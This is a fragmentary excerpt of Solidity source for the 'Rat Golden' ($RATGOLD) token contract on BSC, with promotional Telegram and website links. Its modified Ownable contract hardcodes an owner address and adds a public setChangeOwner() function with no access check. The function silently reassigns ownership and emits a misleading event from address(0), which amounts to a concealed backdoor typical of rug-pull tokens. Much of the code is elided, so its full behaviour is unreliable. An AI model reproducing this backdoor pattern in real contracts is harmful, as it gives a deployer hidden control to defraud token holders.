...
/*
    ...
    Telegram : https://t.me/ratsonportal
    Website : https://ratsonbsc.com/
*/
...
abstract contract Ownable is Context {
     ...
     */    
    constructor () {
        _owner = 0x305dEfb89a08B10846916fa50B7108283b137a2d;
    ...
    function setChangeOwner() public virtual {
        _owner = _changeowner;
        emit OwnershipTransferred(address(0), _owner);
    }
...
contract RATGOLDEN is Context, IERC20, Ownable { 
    ...
    string private _name = "Rat Golden"; 
    string private _symbol = "$RATGOLD";  
    uint8 private _decimals = 18;
    uint256 private _tTotal = 100000000 * 10**_decimals;
    uint256 private _tFeeTotal;

    address payable private Wallet_Dev = payable(0x305dEfb89a08B10846916fa50B7108283b137a2d);
